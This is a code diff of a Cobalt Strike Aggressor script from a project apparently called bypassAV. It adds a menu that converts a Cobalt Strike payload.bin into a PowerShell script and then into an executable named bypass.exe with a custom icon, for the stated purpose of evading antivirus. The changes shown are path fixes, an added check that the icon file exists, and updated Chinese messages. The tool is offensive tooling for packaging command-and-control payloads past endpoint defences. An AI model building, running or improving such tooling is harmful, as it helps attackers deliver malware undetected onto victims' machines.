@@ -4,8 +4,8 @@ popup powershell {
 	item("&生成exe",{dialog_powershell()});
 }
 
-$path = "F:\\cstemp\\bypassAV-master\\";
-$output_file = $path."output";
+$path = "F:\\插件\\bypassAV-master";
+$output_file = $path."\\output";
 
 global('$char_code');
 global('$new_strs');
@@ -43,7 +43,7 @@ sub show {
 	$output_exe = $output_file.'\\'.$3["output_exe"];
 	$ps2exe = $path.'\.\\ps2exe.ps1';
 	mkdir($output_file);
-	if (-exists $bin_path) {
+	if (-exists $bin_path && -exists $ico_path) {
 		payload_bin_to_ps1($bin_path,$payload_file_ps1);
 		$version = right($3["version"], 3);
 		$int_version = left($version, 1);
@@ -61,14 +61,15 @@ sub show {
 		} else {
 			show_message('运行异常，请查看script console');
 		}
-	} else {
-		show_message('请指定bin文件');
+	}
+	else {
+		show_message('请指定bin文件和ico图标');
 	}
 
 }
 
 sub dialog_powershell {
-	$info = dialog("powershell bypass av",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "a.ico", payload => "payload_cs.ps1",version => "4.0",output_exe => "bypass.exe"),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
+	$info = dialog("powershell bypass AV",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "a.ico", payload => "payload_cs.ps1",version => "4.0",output_exe => "bypass.exe"),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
 	# drow_text($info,"ps2exe","ps2exe.ps1");
 	drow_file($info,"bin","Choose: default payload.bin");
 	drow_file($info,"ico","Choose: 添加ico图标");
